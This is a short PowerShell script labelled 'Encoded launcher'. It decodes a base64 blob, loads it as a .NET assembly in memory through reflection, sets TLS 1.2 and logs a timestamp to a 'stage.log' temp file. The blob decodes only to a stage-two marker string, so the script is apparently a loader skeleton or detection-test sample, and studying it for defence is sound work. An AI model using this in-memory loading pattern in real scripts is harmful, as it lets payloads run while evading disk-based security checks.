
# Encoded launcher
$ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpiOTd5bGxqdmxj")
Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length)
[Reflection.Assembly]::Load($ManagedBytes)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
